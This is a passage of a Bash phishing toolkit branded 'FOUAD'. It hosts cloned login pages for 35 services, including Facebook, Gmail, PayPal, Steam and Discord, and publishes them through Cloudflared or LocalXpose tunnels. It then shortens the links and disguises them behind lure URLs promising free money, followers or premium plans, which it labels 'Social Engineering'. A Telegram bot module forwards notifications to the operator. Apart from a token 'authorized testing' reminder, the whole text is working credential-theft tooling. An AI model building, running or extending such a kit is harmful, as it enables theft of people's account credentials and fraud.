		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	sleep 8
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	custom_url "$cldflr_url"
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose (Again...)
start_loclx() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	sleep 12
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
	custom_url "$loclx_url"
	capture_data
}

## Start localhost
start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Compact Tunnel Selection Menu
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${GOLD}┌─────────────────────────────────────────────────────────┐
		${GOLD}│ ${NEON_BLUE}🌐 SELECT FORWARDING SERVICE ${GOLD}│
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}

		${NEON_BLUE}[${GOLD}01${NEON_BLUE}]${NEON_GREEN} Localhost ${LIGHT_CYAN}[${NEON_PINK}Local Only${LIGHT_CYAN}]
		${NEON_BLUE}[${GOLD}02${NEON_BLUE}]${LIGHT_PURPLE} Cloudflared ${LIGHT_CYAN}[${NEON_GREEN}Recommended${LIGHT_CYAN}]
		${NEON_BLUE}[${GOLD}03${NEON_BLUE}]${LIGHT_YELLOW} LocalXpose ${LIGHT_CYAN}[${LIGHT_RED}15 Min Limit${LIGHT_CYAN}]

	EOF

	read -p "${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${NEON_GREEN} Choose service: ${NEON_PINK}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_loclx;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Custom Mask URL
custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
	echo
	if [[ ${mask_op,,} == "y" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
		fi
	fi
}

## URL Shortner
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
		processed_url=${short#http*//}
	fi
}

## Ultra Advanced Link Display System with Smart Detection
custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	
	# Loading animation for URL processing
	loading_animation "Processing URLs with FOUAD Link Engine" 2
	
	# Enhanced URL validation and generation
	local link_status="OFFLINE"
	local short_status="OFFLINE"
	local mask_status="OFFLINE"
	
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		elif [[ $(site_stat $shortcode) == 2* ]]; then
			shorten $shortcode "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
		link_status="ACTIVE"
		short_status="OPTIMIZED"
		mask_status="DISGUISED"
	else
		url="⚠️  No tunnel service detected - Start Cloudflared or LocalXpose first"
		processed_url="⚠️  Tunnel required for URL shortening"
		masked_url="⚠️  Tunnel required for URL masking"
	fi

	# Advanced Link Display Interface
	clear
	banner_small
	echo
	
	cat <<- EOF
		${GOLD}┌─────────────────────────────────────────────────────────┐
		${GOLD}│ ${NEON_PINK}🔗 FOUAD LINK CENTER ${GOLD}│
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}
		
		${NEON_BLUE}┌─────────────────────────────────────────────────────────┐
		${NEON_BLUE}│ ${LIGHT_CYAN}📊 LINK STATUS ${NEON_BLUE}│
		${NEON_BLUE}└─────────────────────────────────────────────────────────┘${RESET}
	EOF
	
	# Dynamic status display based on link availability
	if [[ $link_status == "ACTIVE" ]]; then
		cat <<- EOF
		
		${NEON_GREEN}[${GOLD}🌐${NEON_GREEN}]${LIGHT_CYAN} ${BOLD}PRIMARY LINK${RESET}${LIGHT_CYAN} (Direct Access):
		${LIGHT_PURPLE}    ├─ ${NEON_GREEN}${UNDERLINE}$url${RESET}
		${LIGHT_PURPLE}    └─ ${LIGHT_YELLOW}Status: ${NEON_GREEN}${BOLD}✓ ACTIVE${RESET}
		
		${NEON_BLUE}[${GOLD}🔗${NEON_BLUE}]${LIGHT_CYAN} ${BOLD}SHORTENED LINK${RESET}${LIGHT_CYAN} (Easy Sharing):
		${LIGHT_PURPLE}    ├─ ${LIGHT_BLUE}${UNDERLINE}$processed_url${RESET}
		${LIGHT_PURPLE}    └─ ${LIGHT_YELLOW}Status: ${NEON_GREEN}${BOLD}✓ OPTIMIZED${RESET}
		
		${NEON_PINK}[${GOLD}🎭${NEON_PINK}]${LIGHT_CYAN} ${BOLD}MASKED LINK${RESET}${LIGHT_CYAN} (Social Engineering):
		${LIGHT_PURPLE}    ├─ ${NEON_PINK}${UNDERLINE}$masked_url${RESET}
		${LIGHT_PURPLE}    └─ ${LIGHT_YELLOW}Status: ${NEON_GREEN}${BOLD}✓ DISGUISED${RESET}
		EOF
	else
		cat <<- EOF
		
		${LIGHT_RED}[${GOLD}❌${LIGHT_RED}]${LIGHT_CYAN} ${BOLD}PRIMARY LINK${RESET}${LIGHT_CYAN} (Direct Access):
		${LIGHT_PURPLE}    ├─ ${LIGHT_RED}$url${RESET}
		${LIGHT_PURPLE}    └─ ${LIGHT_YELLOW}Status: ${LIGHT_RED}${BOLD}✗ OFFLINE${RESET}
		
		${LIGHT_RED}[${GOLD}❌${LIGHT_RED}]${LIGHT_CYAN} ${BOLD}SHORTENED LINK${RESET}${LIGHT_CYAN} (Easy Sharing):
		${LIGHT_PURPLE}    ├─ ${LIGHT_RED}$processed_url${RESET}
		${LIGHT_PURPLE}    └─ ${LIGHT_YELLOW}Status: ${LIGHT_RED}${BOLD}✗ OFFLINE${RESET}
		
		${LIGHT_RED}[${GOLD}❌${LIGHT_RED}]${LIGHT_CYAN} ${BOLD}MASKED LINK${RESET}${LIGHT_CYAN} (Social Engineering):
		${LIGHT_PURPLE}    ├─ ${LIGHT_RED}$masked_url${RESET}
		${LIGHT_PURPLE}    └─ ${LIGHT_YELLOW}Status: ${LIGHT_RED}${BOLD}✗ OFFLINE${RESET}
		EOF
	fi
	
	cat <<- EOF
		
		${GOLD}${BOLD}╔═══════════════════════════════════════════════════════════════════════╗
		${GOLD}${BOLD}║                      ${NEON_GREEN}🎯 DEPLOYMENT INSTRUCTIONS                     ${GOLD}${BOLD}║
		${GOLD}${BOLD}╚═══════════════════════════════════════════════════════════════════════╝${RESET}
	EOF
	
	if [[ $link_status == "ACTIVE" ]]; then
		cat <<- EOF
		
		${LIGHT_CYAN}${BOLD}📋 USAGE GUIDELINES:${RESET}
		${NEON_GREEN}  ▶ ${LIGHT_CYAN}Copy any of the above links for your campaign
		${NEON_GREEN}  ▶ ${LIGHT_CYAN}Share via social media, email, or messaging platforms
		${NEON_GREEN}  ▶ ${LIGHT_CYAN}Monitor real-time activity in the capture interface
		${NEON_GREEN}  ▶ ${LIGHT_CYAN}Use masked links for enhanced social engineering
		
		${LIGHT_RED}${BOLD}⚠️  SECURITY REMINDER:${RESET}
		${LIGHT_YELLOW}  • Only use for authorized penetration testing
		${LIGHT_YELLOW}  • Ensure proper legal permissions before deployment
		${LIGHT_YELLOW}  • Follow responsible disclosure practices
		
		${NEON_BLUE}${BOLD}╔═══════════════════════════════════════════════════════════════════════╗
		${NEON_BLUE}${BOLD}║ ${NEON_GREEN}🚀 READY FOR DEPLOYMENT${RESET} ${NEON_BLUE}${BOLD}• ${NEON_PINK}Press ENTER to continue monitoring${RESET} ${NEON_BLUE}${BOLD}║
		${NEON_BLUE}${BOLD}╚═══════════════════════════════════════════════════════════════════════╝${RESET}
		EOF
	else
		cat <<- EOF
		
		${LIGHT_RED}${BOLD}🔧 TROUBLESHOOTING STEPS:${RESET}
		${LIGHT_YELLOW}  1. ${LIGHT_CYAN}Return to main menu and select a tunnel service
		${LIGHT_YELLOW}  2. ${LIGHT_CYAN}Choose option [02] Cloudflared or [03] LocalXpose
		${LIGHT_YELLOW}  3. ${LIGHT_CYAN}Ensure internet connection is stable
		${LIGHT_YELLOW}  4. ${LIGHT_CYAN}Wait for tunnel establishment before generating links
		
		${NEON_GREEN}${BOLD}💡 QUICK FIXES:${RESET}
		${NEON_GREEN}  • ${LIGHT_CYAN}Check your internet connection
		${NEON_GREEN}  • ${LIGHT_CYAN}Restart your network interface
		${NEON_GREEN}  • ${LIGHT_CYAN}Try a different tunnel service
		${NEON_GREEN}  • ${LIGHT_CYAN}Verify firewall settings
		
		${LIGHT_RED}${BOLD}╔═══════════════════════════════════════════════════════════════════════╗
		${LIGHT_RED}${BOLD}║ ${LIGHT_YELLOW}⚠️  SETUP REQUIRED${RESET} ${LIGHT_RED}${BOLD}• ${NEON_PINK}Configure tunnel service first${RESET} ${LIGHT_RED}${BOLD}║
		${LIGHT_RED}${BOLD}╚═══════════════════════════════════════════════════════════════════════╝${RESET}
		EOF
	fi
	
	# Interactive feedback based on status
	echo
	if [[ $link_status == "ACTIVE" ]]; then
		typewriter "🔥 Links generated successfully! Ready for deployment..." "$NEON_GREEN" 0.03
	else
		typewriter "⚠️  Links unavailable - Please configure tunnel service first!" "$LIGHT_RED" 0.03
		typewriter "💡 Tip: Select Cloudflared or LocalXpose from tunnel menu" "$LIGHT_YELLOW" 0.03
	fi
	echo
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk
site_vk() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='https://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## Compact Beautiful Main Menu
main_menu() {
	set_terminal_title "Main Menu"
	{ clear; banner; echo; }
	
	cat <<- EOF
		${GOLD}┌─────────────────────────────────────────────────────────┐
		${GOLD}│ ${NEON_PINK}🎯 SELECT TARGET PLATFORM ${GOLD}│
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}

		${NEON_BLUE}[${GOLD}01${NEON_BLUE}]${NEON_GREEN} Facebook    ${NEON_BLUE}[${GOLD}11${NEON_BLUE}]${NEON_GREEN} Twitch      ${NEON_BLUE}[${GOLD}21${NEON_BLUE}]${NEON_GREEN} DeviantArt
		${NEON_BLUE}[${GOLD}02${NEON_BLUE}]${LIGHT_CYAN} Instagram   ${NEON_BLUE}[${GOLD}12${NEON_BLUE}]${LIGHT_CYAN} Pinterest   ${NEON_BLUE}[${GOLD}22${NEON_BLUE}]${LIGHT_CYAN} Badoo
		${NEON_BLUE}[${GOLD}03${NEON_BLUE}]${NEON_PINK} Google      ${NEON_BLUE}[${GOLD}13${NEON_BLUE}]${NEON_PINK} Snapchat    ${NEON_BLUE}[${GOLD}23${NEON_BLUE}]${NEON_PINK} Origin
		${NEON_BLUE}[${GOLD}04${NEON_BLUE}]${LIGHT_PURPLE} Microsoft   ${NEON_BLUE}[${GOLD}14${NEON_BLUE}]${LIGHT_PURPLE} Linkedin    ${NEON_BLUE}[${GOLD}24${NEON_BLUE}]${LIGHT_PURPLE} DropBox
		${NEON_BLUE}[${GOLD}05${NEON_BLUE}]${LIGHT_RED} Netflix     ${NEON_BLUE}[${GOLD}15${NEON_BLUE}]${LIGHT_RED} Ebay        ${NEON_BLUE}[${GOLD}25${NEON_BLUE}]${LIGHT_RED} Yahoo
		${NEON_BLUE}[${GOLD}06${NEON_BLUE}]${LIGHT_BLUE} Paypal      ${NEON_BLUE}[${GOLD}16${NEON_BLUE}]${LIGHT_BLUE} Quora       ${NEON_BLUE}[${GOLD}26${NEON_BLUE}]${LIGHT_BLUE} Wordpress
		${NEON_BLUE}[${GOLD}07${NEON_BLUE}]${LIGHT_GREEN} Steam       ${NEON_BLUE}[${GOLD}17${NEON_BLUE}]${LIGHT_GREEN} Protonmail  ${NEON_BLUE}[${GOLD}27${NEON_BLUE}]${LIGHT_GREEN} Yandex
		${NEON_BLUE}[${GOLD}08${NEON_BLUE}]${LIGHT_YELLOW} Twitter     ${NEON_BLUE}[${GOLD}18${NEON_BLUE}]${LIGHT_YELLOW} Spotify     ${NEON_BLUE}[${GOLD}28${NEON_BLUE}]${LIGHT_YELLOW} StackoverFlow
		${NEON_BLUE}[${GOLD}09${NEON_BLUE}]${SILVER} Playstation ${NEON_BLUE}[${GOLD}19${NEON_BLUE}]${SILVER} Reddit      ${NEON_BLUE}[${GOLD}29${NEON_BLUE}]${SILVER} Vk
		${NEON_BLUE}[${GOLD}10${NEON_BLUE}]${NEON_GREEN} Tiktok      ${NEON_BLUE}[${GOLD}20${NEON_BLUE}]${NEON_GREEN} Adobe       ${NEON_BLUE}[${GOLD}30${NEON_BLUE}]${NEON_GREEN} XBOX
		${NEON_BLUE}[${GOLD}31${NEON_BLUE}]${LIGHT_CYAN} Mediafire   ${NEON_BLUE}[${GOLD}32${NEON_BLUE}]${LIGHT_CYAN} Gitlab      ${NEON_BLUE}[${GOLD}33${NEON_BLUE}]${LIGHT_CYAN} Github
		${NEON_BLUE}[${GOLD}34${NEON_BLUE}]${NEON_PINK} Discord     ${NEON_BLUE}[${GOLD}35${NEON_BLUE}]${NEON_PINK} Roblox

		${GOLD}┌─────────────────────────────────────────────────────────┐
		${NEON_BLUE}[${GOLD}88${NEON_BLUE}]${NEON_BLUE} Telegram Bot ${LIGHT_CYAN}[${GOLD}🤖 Notifications${LIGHT_CYAN}]
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}

		${GOLD}┌─────────────────────────────────────────────────────────┐
		${NEON_BLUE}[${GOLD}99${NEON_BLUE}]${LIGHT_PURPLE} About ${LIGHT_CYAN}• ${NEON_BLUE}[${GOLD}00${NEON_BLUE}]${LIGHT_RED} Exit
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}

	EOF
	
	read -p "${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${NEON_GREEN} Select your target platform: ${NEON_PINK}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='https://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='https://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="reddit"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='https://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='https://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='https://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='https://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='https://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='https://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
			website="discord"
			mask='https://get-discord-nitro-free'
			tunnel_menu;;
		35)
			website="roblox"
			mask='https://get-free-robux'
			tunnel_menu;;
		88)
			telegram_bot_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Compact Startup Sequence
fouad_startup() {
	clear
	
	cat <<- EOF
		${GOLD}┌─────────────────────────────────────────────────────────┐
		${GOLD}│ ${NEON_PINK}🚀 FOUAD INITIALIZATION ${GOLD}│
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}
	EOF
	
	loading_animation "🔧 Core Framework" 1
	loading_animation "🛡️  Security Modules" 1
	loading_animation "🎨 Interface Setup" 1
	loading_animation "🌐 Network Ready" 1
	
	echo
	cat <<- EOF
		${NEON_GREEN}┌─────────────────────────────────────────────────────────┐
		${NEON_GREEN}│ ${LIGHT_GREEN}✅ FOUAD READY! ${NEON_GREEN}│
		${NEON_GREEN}└─────────────────────────────────────────────────────────┘${RESET}
	EOF
	
	play_sound "success"
	sleep 1
}

## Sound Effect Simulation
play_sound() {
	local sound_type="$1"
	case $sound_type in
		"startup")
			echo -e "${NEON_BLUE}♪♫♪ BEEP BEEP BOOP ♪♫♪${RESET}" ;;
		"success")
			echo -e "${NEON_GREEN}♪ DING! ♪${RESET}" ;;
		"error")
			echo -e "${LIGHT_RED}♪ BUZZ! ♪${RESET}" ;;
		"notification")
			echo -e "${LIGHT_YELLOW}♪ PING! ♪${RESET}" ;;
	esac
}

## Real-time Status Display
show_status_bar() {
	local current_time=$(date "+%H:%M:%S")
	local current_date=$(date "+%Y-%m-%d")
	local uptime_info=$(uptime | awk -F'up ' '{print $2}' | awk -F',' '{print $1}' | sed 's/^ *//')
	
	echo -e "${GOLD}${BOLD}╔════════════════════════════════════════════════════════════════╗"
	echo -e "${GOLD}${BOLD}║ ${NEON_GREEN}⏰ Time: ${WHITE}$current_time ${GOLD}│ ${NEON_BLUE}📅 Date: ${WHITE}$current_date ${GOLD}│ ${NEON_PINK}⏳ Up: ${WHITE}$uptime_info ${GOLD}║"
	echo -e "${GOLD}${BOLD}╚════════════════════════════════════════════════════════════════╝${RESET}"
}

## Advanced Terminal Title
set_terminal_title() {
	local title="$1"
	echo -ne "\033]0;FOUAD Advanced Framework - $title\007"
}

## Telegram Bot Integration System
TELEGRAM_CONFIG_FILE=".fouad_telegram_config"

# Get device location using IP geolocation
get_location() {
	local ip_info=$(curl -s "http://ipinfo.io/json" 2>/dev/null)
	if [[ $? -eq 0 && -n "$ip_info" ]]; then
		local city=$(echo "$ip_info" | grep -o '"city":"[^"]*' | cut -d'"' -f4)
		local region=$(echo "$ip_info" | grep -o '"region":"[^"]*' | cut -d'"' -f4)
		local country=$(echo "$ip_info" | grep -o '"country":"[^"]*' | cut -d'"' -f4)
		local public_ip=$(echo "$ip_info" | grep -o '"ip":"[^"]*' | cut -d'"' -f4)
		echo "📍 $city, $region, $country | 🌐 IP: $public_ip"
	else
		echo "📍 Location unavailable"
	fi
}

# Get detailed device information
get_device_info() {
	local hostname=$(hostname 2>/dev/null || echo "Unknown")
	local os_info=$(uname -s 2>/dev/null || echo "Unknown")
	local kernel=$(uname -r 2>/dev/null || echo "Unknown")
	local arch=$(uname -m 2>/dev/null || echo "Unknown")
	local uptime=$(uptime -p 2>/dev/null || echo "Unknown")
	local local_ip=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}' || echo "Unknown")
	
	cat <<- EOF
🖥️ Device: $hostname
💻 OS: $os_info $kernel ($arch)
🔌 Local IP: $local_ip
⏰ Uptime: $uptime
	EOF
}

# Send message to Telegram bot
send_telegram_message() {
	local message="$1"
	
	if [[ ! -f "$TELEGRAM_CONFIG_FILE" ]]; then
		return 1
	fi
	
	source "$TELEGRAM_CONFIG_FILE"
	
	if [[ -z "$TELEGRAM_BOT_TOKEN" || -z "$TELEGRAM_CHAT_ID" ]]; then
		return 1
	fi
	
	local url="https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"
	local payload=$(cat <<EOF
{
	"chat_id": "$TELEGRAM_CHAT_ID",
	"text": "$message",
	"parse_mode": "HTML"
}
EOF
)
	
	curl -s -X POST "$url" \
		-H "Content-Type: application/json" \
		-d "$payload" > /dev/null 2>&1
	
	return $?
}

# Configure Telegram bot
configure_telegram_bot() {
	clear
	banner_small
	echo
	
	cat <<- EOF
		${GOLD}┌─────────────────────────────────────────────────────────┐
		${GOLD}│ ${NEON_BLUE}🤖 TELEGRAM BOT CONFIGURATION ${GOLD}│
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}
		
		${LIGHT_CYAN}📋 Setup Instructions:${RESET}
		${NEON_GREEN}1. ${LIGHT_CYAN}Create a bot via @BotFather on Telegram
		${NEON_GREEN}2. ${LIGHT_CYAN}Get your bot token (format: 123456:ABC-DEF...)
		${NEON_GREEN}3. ${LIGHT_CYAN}Get your chat ID (send /start to @userinfobot)
		${NEON_GREEN}4. ${LIGHT_CYAN}Enter the details below
		
	EOF
	
	# Get bot token
	echo -ne "${NEON_BLUE}[${GOLD}🤖${NEON_BLUE}]${NEON_GREEN} Enter Bot Token: ${NEON_PINK}"
	read -r bot_token
	
	if [[ -z "$bot_token" ]]; then
		echo -e "\n${LIGHT_RED}❌ Bot token cannot be empty!${RESET}"
		sleep 2
		return 1
	fi
	
	# Get chat ID
	echo -ne "${NEON_BLUE}[${GOLD}💬${NEON_BLUE}]${NEON_GREEN} Enter Chat ID: ${NEON_PINK}"
	read -r chat_id
	
	if [[ -z "$chat_id" ]]; then
		echo -e "\n${LIGHT_RED}❌ Chat ID cannot be empty!${RESET}"
		sleep 2
		return 1
	fi
	
	# Save configuration
	cat > "$TELEGRAM_CONFIG_FILE" <<EOF
TELEGRAM_BOT_TOKEN="$bot_token"
TELEGRAM_CHAT_ID="$chat_id"
EOF
	
	chmod 600 "$TELEGRAM_CONFIG_FILE"
	
	# Test connection
	loading_animation "Testing Telegram connection" 2
	
	local test_message="🚀 <b>FOUAD Framework Connected!</b>

📱 Bot successfully configured
🕐 $(date '+%Y-%m-%d %H:%M:%S')
$(get_device_info)
$(get_location)

✅ Ready to receive notifications!"
	
	if send_telegram_message "$test_message"; then
